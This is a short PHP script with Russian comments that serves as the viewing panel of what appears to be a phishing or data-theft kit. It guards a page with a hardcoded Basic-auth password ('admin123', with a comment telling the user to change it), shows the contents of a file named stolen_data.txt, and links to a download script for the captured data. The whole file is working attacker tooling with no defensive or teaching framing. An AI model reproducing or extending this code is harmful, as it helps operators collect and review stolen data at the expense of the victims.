<?php
// view.php - просмотр stolen_data.txt

// Защита паролем (чтобы никто чужой не зашел)
$password = "admin123"; // СМЕНИ НА СВОЙ ПАРОЛЬ

if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_PW'] != $password) {
    header('WWW-Authenticate: Basic realm="Protected Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Доступ запрещен';
    exit;
}

// Читаем файл с данными
$file = 'stolen_data.txt';
if (file_exists($file)) {
    $content = file_get_contents($file);
    echo "<pre style='font-family: monospace; background: #f5f5f5; padding: 20px; border-radius: 5px;'>";
    echo $content ? $content : "Файл пуст";
    echo "</pre>";
    
    // Ссылка на скачивание
    echo "<a href='download.php' style='background: #1a73e8; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;'>📥 Скачать данные</a>";
} else {
    echo "Файл с данными еще не создан";
}
?>